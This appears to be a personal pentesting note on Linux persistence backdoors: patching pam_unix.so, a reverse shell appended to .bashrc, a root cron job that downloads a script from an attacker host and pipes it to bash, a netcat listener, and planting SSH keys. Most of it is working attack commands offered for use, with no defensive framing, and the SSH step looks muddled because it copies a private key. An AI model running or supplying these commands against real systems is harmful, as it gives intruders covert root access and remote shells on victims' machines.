
![Garage door](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExOTI4YTQxMDEzNTRiOTQzMmFjMzQxZmQ2NTg2MDRjZjQwYTUzZDIxNCZlcD12MV9pbnRlcm5hbF9naWZzX2dpZklkJmN0PWc/3o6Mb6aijVsBCIc6oU/giphy.gif)

>[!INFO]
>A backdoor refers to **any method** by which **authorized** and **unauthorized users** are able to get around normal security measures and **gain high level** user access (aka root access) on a computer **system**, **network**, or **software application**.
They are known for being **discreet**. Backdoors exist for a select group of people in the know to **gain easy access to a system or application**.

# PAM

>[!INFO]
>This backdoor essentially consists of **adding your own password** to the **pam_unix.so** file

_pam\_unix.so_ file is responsible for **authentication**

![[Pasted image 20240906155618.png]]

_pam\_unix.so_ uses the unix\_verify\_password function to verify to user's supplied password **:**

![[Pasted image 20240906155623.png]]

# .bashsrc

>[!INFO]
>If a user has **bash** as their **login shell**, the "**.bashrc**" file in their home directory is **executed** when an interactive session is launched.

Any user that log in often :

```bash
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```

- **Put a nc listener**

# CronJob

## With a root access

>[!INFO]
>_cronjobs file ->_ _**/etc/cronjob**_

- Configure a task where every minute a reverse shell is sent to you. Add this line into your cronjob file :

```
* *     * * *   root    curl http://$attacker_ip:8080/shell | bash
```

- Add this to the **shell** file :

```bash
#!/bin/bash
bash -i >& /dev/tcp/$ip/$port 0>&1
```

- On the attacker machine :

```bash
nc -nvlp $port
```

# SSH

>[!INFO]
>Consists in **saving** our **ssh keys** in some **user’s home** directory. Then we can access it via ssh.

## Generate ssh key

```bash
ssh-keygen
```

## Copy our key into the user's .ssh directory

```bash
# if no .ssh directory -> create it
mkdir .ssh 

cp id_rsa .ssh/id_rsa
```
